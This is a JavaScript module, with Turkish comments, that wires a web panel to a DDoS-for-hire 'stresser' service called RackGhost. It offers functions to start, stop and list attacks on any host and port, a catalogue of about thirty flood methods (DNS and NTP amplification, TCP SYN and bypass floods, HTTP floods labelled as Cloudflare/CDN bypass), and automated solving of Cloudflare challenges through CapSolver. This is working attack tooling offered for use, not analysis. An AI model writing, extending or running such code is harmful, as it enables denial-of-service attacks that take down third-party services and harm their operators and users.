/**
 * rackghost.js
 * RackGhost stresser entegrasyonu (stresse.st alternatifi provider).
 *
 * RackGhost'un public API'si yok ve Cloudflare sunucu istemcilerini
 * engelliyor; bu yuzden yerel oturum servisi (127.0.0.1:3210,
 * backend/rg_service.py) kullaniliyor. Servis CapSolver ile CF challenge'i
 * cozer, login olur ve panel/stresser_api.php cagrilarini iletir.
 *
 * Watchdog servis sagligini izler; oturum koptugunda Telegram'dan bildirir.
 */

const axios = require('axios');
const { sendTelegram } = require('./telegram');

const SERVICE_URL = 'http://127.0.0.1:3210';
const WATCHDOG_INTERVAL_MS = 5 * 60 * 1000;

const METHODS = [
  { value: 'SOUNDV3', label: '[BETA] SOUND-V3 (HTTPS/HTTP3) [CF]', layer: 'L7' },
  { value: 'SPAMMERV3', label: '[BETA] SPAMMER v3 (HTTP/1.x HTTP/2) [CDN]', layer: 'L7' },
  { value: 'HTTPSMIX', label: '[BETA] HTTPS-MIX', layer: 'L7' },
  { value: 'SOCKETV5', label: '[BETA] SOCKET V5 (HTTP/1.1 HTTPS)', layer: 'L7' },
  { value: 'WEBSOCKETV2', label: '[BETA] WEBSOCKET v2 (WS/WSS)', layer: 'L7' },
  { value: 'SOUNDV2', label: 'SOUND-V2 (HTTP/HTTPS/HTTP2) [CF]', layer: 'L7' },
  { value: 'HTTPSCRYPTO', label: 'HTTPS-CRYPTO v2 (HTTPS2)', layer: 'L7' },
  { value: 'HTTPSFLOOD', label: 'HTTPS REQUEST-CUSTOM (HTTP/HTTP2)', layer: 'L7' },
  { value: 'HTTPCUSTOM', label: 'HTTPS-CUSTOM v2 (Browser) [ENT]', layer: 'L7' },
  { value: 'SOCKETV4', label: 'SOCKET V4 (HTTP/1.1)', layer: 'L7' },
  { value: 'SPAMMERV2', label: 'SPAMMER v2 (HTTPS/1.1)', layer: 'L7' },
  { value: 'WEBSOCKET-CUSTOM', label: 'WEBSOCKET-CUSTOM (WS/WSS)', layer: 'L7' },
  { value: 'TOR', label: 'TOR (.onion)', layer: 'L7' },
  { value: 'DNS', label: 'DNS Amplification', layer: 'L4' },
  { value: 'NTP', label: 'NTP Amplification', layer: 'L4' },
  { value: 'TCPSYNRST', label: 'TCP SYN RST', layer: 'L4' },
  { value: 'TCPACK', label: 'TCP ACK', layer: 'L4' },
  { value: 'TCPBYPASS', label: 'TCP Bypass', layer: 'L4' },
  { value: 'TCPBYPASS2', label: 'TCP Bypass v2', layer: 'L4' },
  { value: 'TCPGAME', label: 'TCP Game', layer: 'L4' },
  { value: 'TCPSSH', label: 'TCP SSH', layer: 'L4' },
  { value: 'TCPSYN', label: 'TCP SYN', layer: 'L4' },
  { value: 'TCPSYNACK', label: 'TCP SYNACK', layer: 'L4' },
  { value: 'UDPABUSE', label: 'UDP Abuse', layer: 'L4' },
  { value: 'UDPGAMESERVER', label: 'UDP Game Server', layer: 'L4' },
  { value: 'ICMP', label: 'ICMP', layer: 'L4' },
  { value: 'UDPCUSTOM', label: 'UDP Custom', layer: 'L4' },
  { value: 'TCPCUSTOM', label: 'TCP Custom', layer: 'L4' },
  { value: 'TCPAMP', label: 'TCP Enterprise', layer: 'L4' },
  { value: 'UDPMIX', label: 'UDP Mix', layer: 'L4' },
  { value: 'UDPTCPMIX', label: 'UDP+TCP Mix', layer: 'L4' }
];

const LIMITS = { maxTime: 7200, maxConcurrents: 15 };

// Bazi methodlar girilen concurrents'in kati kadar slot tuketir (or. HTTPSMIX 2x).
// Kullanici tuketmek istedigi degeri girer; gonderilen deger sistemde bölünur.
const METHOD_MULTIPLIERS = { HTTPSMIX: 2 };

function slotMultiplier(method) {
  return METHOD_MULTIPLIERS[String(method).toUpperCase()] || 1;
}

// Bilinen upstream hatalarini kisa Turkce mesaja cevir
function normalizeRgError(msg) {
  const m = String(msg || '');
  if (/reached the limit of available slots/i.test(m)) {
    return 'RackGhost slot limiti doldu; bir saldırıyı durdurup tekrar deneyin.';
  }
  if (/wait 1 second/i.test(m)) {
    return 'RackGhost hız sınırı; birkaç saniye sonra kendiliğinden düzelir.';
  }
  return m;
}

let lastOkAt = null;
let lastError = null;
let serviceAlerted = false;
let watchdogTimer = null;
let lastApiCallAt = 0;
let consecutiveUnhealthy = 0;
// Kac ardisik sagliksiz tick'te alarm verilsin (5dk/tick): restart/login
// pencereleri (CapSolver cozumu ~30-60sn) yanlis alarm uretmesin.
const UNHEALTHY_ALERT_THRESHOLD = 3;

// RackGhost rate limit: 1 istek/sn. Slot ANINDA rezerve edilir; aksi halde
// ayni milisaniyede gelen istekler (loop launch + canli liste + yoklama)
// uykudan once okuyup birlikte cikar ve 1sn kuralini ihlal eder.
async function throttle() {
  const now = Date.now();
  const at = Math.max(now, lastApiCallAt + 1100);
  lastApiCallAt = at;
  const wait = at - now;
  if (wait > 0) await new Promise((r) => setTimeout(r, wait));
}

async function apiCall(payload) {
  try {
    await throttle();
    const res = await axios.post(`${SERVICE_URL}/api`, payload, { timeout: 120000 });
    const data = res.data;
    if (!data || !data.ok) {
      const err = new Error((data && data.error) || 'servis hatasi');
      if (data && data.retry) err.retryable = true;
      throw err;
    }
    lastOkAt = new Date().toISOString();
    lastError = null;
    serviceAlerted = false;
    return data.data;
  } catch (err) {
    if (err.code === 'ECONNREFUSED') {
      const e = new Error('rackghost oturum servisi kapali (127.0.0.1:3210)');
      e.serviceDown = true;
      throw e;
    }
    if (err.response && err.response.data && err.response.data.error) {
      throw new Error(err.response.data.error);
    }
    throw err;
  }
}

/** Saldiri baslat. params: {host, port, time, concurrents, method}
 *  concurrents: kullanicinin TUKETMEK istedigi slot; carpanli methodlarda
 *  upstream'e bolunmus deger gonderilir. */
async function startAttack(params) {
  const method = String(params.method).toUpperCase();
  const mult = slotMultiplier(method);
  const wanted = parseInt(params.concurrents) || 1;
  // Kullanicinin girdigi deger tuketilen slottur; carpan sadece upstream'e
  // gonderilen birimi belirler (wanted/mult). Limit kullanici degeri uzerinden.
  if (wanted > LIMITS.maxConcurrents) {
    throw new Error(`RackGhost: en fazla ${LIMITS.maxConcurrents} concurrent girebilirsiniz.`);
  }
  const sendConc = Math.max(1, Math.floor(wanted / mult));
  let data;
  try {
    data = await apiCall({
      action: 'start',
      api: 2,
      params: {
        host: params.host,
        port: parseInt(params.port),
        time: parseInt(params.time),
        concurrents: sendConc,
        method
      }
    });
  } catch (err) {
    throw new Error(normalizeRgError(err.message));
  }
  if (!data || !data.success) {
    throw new Error(normalizeRgError(data?.message || data?.error || 'RackGhost saldiri baslatamadi'));
  }
  const items = Array.isArray(data.data) ? data.data : (data.data ? [data.data] : []);
  // RackGhost her saldiriyi tek kayit + 'slots' alaniyla dondurur;
  // gercek concurrent sayisi slots toplamidir.
  const slotsTotal = items.reduce((sum, it) => sum + (parseInt(it.slots, 10) || 1), 0);
  return { message: data.message, attackIds: items.map((it) => String(it.id)), raw: items, slotsTotal };
}

/** Saldiri durdur (id + host gerekli) */
async function stopAttack(id, host) {
  return apiCall({ action: 'stop', api: 2, id: String(id), host });
}

/** Aktif saldirilar */
async function getOngoing() {
  const data = await apiCall({ action: 'ongoing', api: 2 });
  return data && Array.isArray(data.data) ? data.data : [];
}

function getMethods() {
  return METHODS;
}

function isConfigured() {
  return true;
}

function getStatus() {
  return {
    configured: true,
    lastOkAt,
    lastError,
    limits: LIMITS
  };
}

async function watchdogTick() {
  let healthy = false;
  let detail = '';
  try {
    const res = await axios.get(`${SERVICE_URL}/health`, { timeout: 10000 });
    const h = res.data || {};
    healthy = Boolean(h.ok);
    detail = h.ok ? '' : (h.detail || `servis: ${h.state}`);
  } catch (err) {
    detail = 'oturum servisi kapali';
  }

  if (healthy) {
    consecutiveUnhealthy = 0;
    serviceAlerted = false;
    return;
  }

  consecutiveUnhealthy += 1;
  lastError = detail;
  // Esik altindaki gecici durumlar (restart, CapSolver login penceresi) sessiz gecilir
  if (consecutiveUnhealthy < UNHEALTHY_ALERT_THRESHOLD) return;
  if (!serviceAlerted) {
    serviceAlerted = true;
    sendTelegram(
      `⚠️ <b>RackGhost oturum servisi sorunlu</b>\n` +
      `Durum: ${detail || 'bilinmiyor'} (${consecutiveUnhealthy} ardışık kontrol)\n` +
      `CapSolver bakiyesi ve servis loglari kontrol edilmeli.`
    ).catch(() => {});
  }
}

function initRackghost() {
  if (watchdogTimer) clearInterval(watchdogTimer);
  watchdogTimer = setInterval(() => {
    watchdogTick().catch((err) => console.warn('[rackghost] watchdog:', err.message));
  }, WATCHDOG_INTERVAL_MS);
  watchdogTick().catch(() => {});
  console.log('[rackghost] init: yerel oturum servisi modu (127.0.0.1:3210)');
}

module.exports = {
  initRackghost,
  startAttack,
  stopAttack,
  getOngoing,
  getMethods,
  getStatus,
  isConfigured,
  LIMITS
};
